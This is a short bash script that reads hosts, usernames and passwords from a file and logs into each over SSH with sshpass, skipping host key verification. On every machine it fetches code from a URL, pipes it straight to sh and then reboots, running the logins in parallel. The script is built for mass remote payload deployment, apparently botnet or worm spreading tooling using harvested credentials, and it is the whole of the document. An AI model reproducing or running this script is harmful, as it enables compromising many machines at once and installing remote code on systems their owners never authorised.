#!/bin/bash

cat IP.txt | while read ip ; do
    host=$(echo $ip | awk '{ print $1 }')
    user=$(echo $ip | awk '{ print $2 }')
    pass=$(echo $ip | awk '{ print $3 }')
    sshpass -p $pass ssh -p2253 -oConnectTimeout=10 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null $user@$host "trigger_url $URL | sh; reboot" &
    sleep 0.15
done
